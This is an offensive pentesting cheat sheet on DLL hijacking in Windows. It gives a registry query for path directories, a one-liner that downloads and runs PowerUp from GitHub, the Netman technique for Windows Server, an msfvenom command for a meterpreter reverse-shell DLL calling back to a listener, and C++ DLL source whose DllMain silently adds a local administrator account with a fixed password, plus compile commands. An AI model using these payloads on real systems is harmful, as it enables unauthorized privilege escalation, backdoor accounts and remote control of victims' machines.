---
description: Some methods to perform a DLL Hijacking in a Windows environment
---

# DLL Hijacking

### Definition

DLL hijacking is a method of injecting malicious code into an application by exploiting the way some Windows applications search and load Dynamic Link Libraries (DLL).

Only Microsoft operating systems are susceptible to DLL hijacks.

By replacing a required DLL file with an infected version and placing it within the search parameters of an application, the infected file will be called upon when the application loads, activating its malicious operations.

For a DLL hijack to be successful, a victim needs to load an infected DLL file from the same directory as the targeted application.

### Find all possible paths

When looking for a DLL Hijacking, you must look to the system path to find where you can put your DLLs

#### Using Register

```
reg query “HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment” /V Path
```

#### Using a tool

First you need to import PowerUp to you powershell :

```
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1")
```

And then you can use the following command :&#x20;

```
Find-PathDLLHijack
```

### Netman for a Windows Server

If you need to make a DLL Hijacking in a Windows Server from 2008 to 2019, you can use Netman to involve your DLL.

{% embed url="https://itm4n.github.io/windows-server-netman-dll-hijacking/" %}
Blog post from itm4n
{% endembed %}

And to use it you have to build your own DLL ( see next part ) and rename it to **\***wlanhlp.dll\* and \*wlanapi.dll\*.

And then upload it to the path with NetManTrigger.exe and run it to involve your DLLs.

### Build your own DLL

You can build it using msfvenom with:&#x20;

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f dll -o msf.dll
```

or you can create it using C# :&#x20;

```csharp
#include <stdio.h>
#include <windows.h>

#ifdef BUILD_DLL
    #define DLL_EXPORT __declspec(dllexport)
#else
    #define DLL_EXPORT __declspec(dllimport)
#endif

BOOL running = FALSE;

void DLL_EXPORT initCallback()
{    
    if(!running) {
      system("net user /add Admin Admin@123 && net localgroup administrators Admin /add");
      running = TRUE;
    }

}

extern "C" DLL_EXPORT BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
                  initCallback();
            break;

        case DLL_PROCESS_DETACH:
                  initCallback();
            break;

        case DLL_THREAD_ATTACH:
                  initCallback();
            break;

        case DLL_THREAD_DETACH:
                  initCallback();
            break;
    }
    return TRUE;
}
```

It will create an Admin user in the server and you will then be able to connect to it.

To build it :&#x20;

```powershell
C:\> g++.exe -Wall -DBUILD_DLL -O2 -c WptsExtensions.cpp -o WptsExtensions.o

(cmd) C:\> g++.exe -shared -Wl,--dll WptsExtensions.o -o WptsExtensions.dll
ou
(powershell) C:\> g++.exe -shared '-Wl,--dll' WptsExtensions.o -o WptsExtensions.dll
```
